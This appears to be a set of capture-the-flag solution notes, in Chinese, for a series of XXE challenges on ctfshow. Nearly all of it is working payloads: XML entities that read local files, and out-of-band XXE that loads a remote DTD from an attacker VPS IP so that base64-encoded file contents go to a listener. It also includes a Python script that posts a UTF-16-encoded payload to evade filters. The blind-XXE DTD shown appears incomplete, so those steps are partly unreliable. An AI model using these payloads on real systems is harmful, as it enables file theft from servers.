## 373、有回显

```xml
# Payload
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<njh>
    <ctfshow>$xxe</ctfshow>
</njh>
```



## 374、375、376、无回显

```shell
# VPS
# 1、创建text.dtd
vim text.dtd
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % aaa SYSTEM "http://124.223.13.156/text.dtd">
%aaa;
]>
<root>123</root>
# 2、监听端口
python3 -m http.server 80
```

```xml
# Payload
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % aaa SYSTEM "http://124.223.13.156/text.dtd">
%aaa;
]>
<root>123</root>
```



## 377、无回显

```shell
# VPS
# 1、创建text.dtd
vim text.dtd
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % aaa SYSTEM "http://124.223.13.156/text.dtd">
%aaa;
]>
<root>123</root>
# 2、监听端口
python3 -m http.server 80
```

```python
# Payload
import requests

url = 'http://46a63829-554b-40bd-a22b-1619d1c17f90.challenge.ctf.show/'
payload = """<!DOCTYPE test [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
    <!ENTITY % aaa SYSTEM "http://124.223.13.156/text.dtd">
    %aaa;
]>
<root>123</root>"""
payload = payload.encode('utf-16')
requests.post(url,data=payload)
```



## 378、有回显

```xml
# Payload
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<user><username>&xxe;</username><password>&xxe;</password></user>
```

